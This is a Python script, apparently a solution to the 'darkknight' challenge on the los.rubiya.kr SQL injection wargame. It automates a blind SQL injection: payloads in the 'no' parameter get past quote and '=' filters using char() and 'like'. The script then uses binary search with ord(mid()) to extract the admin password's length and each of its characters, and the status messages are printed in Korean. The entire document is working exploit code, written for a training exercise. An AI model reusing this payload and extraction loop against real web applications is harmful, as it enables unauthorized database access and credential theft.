import requests

url = "https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php"
cookie = {'PHPSESSID': 'cookie'}

def find_length():
    pwlength = 1

    while True:
        param = {"no": "1 or id like char(97, 100, 109, 105, 110) and length(pw) like {} #".format(pwlength)}
        req = requests.get(url, params = param, cookies = cookie)
        if "Hello admin" in req.text:
            return pwlength
        else:
            pwlength += 1

def find_pw():
    length = find_length()
    print("비밀번호 길이: ", length)
    password = ""
    for i in range(length):
        s = 1
        e = 127
        value = 64
        while True:
            param = {"no": "1 or id like char(97, 100, 109, 105, 110) and ord(mid(pw, {}, 1)) like {} #".format(i+1, value)}
            print(param)
            req = requests.get(url, params = param, cookies = cookie)
            if "Hello admin" in req.text:
                password += chr(value)
                break
            else:
                param = {"no": "1 or id like char(97, 100, 109, 105, 110) and ord(mid(pw, {}, 1)) > {} #".format(i+1, value)}
                req = requests.get(url, params = param, cookies = cookie)
                if "Hello admin" in req.text:
                    s = value
                    value = (value + e) // 2
                else:
                    e = value
                    value = (s + value) // 2
    print("비밀번호는: ", password)

find_pw()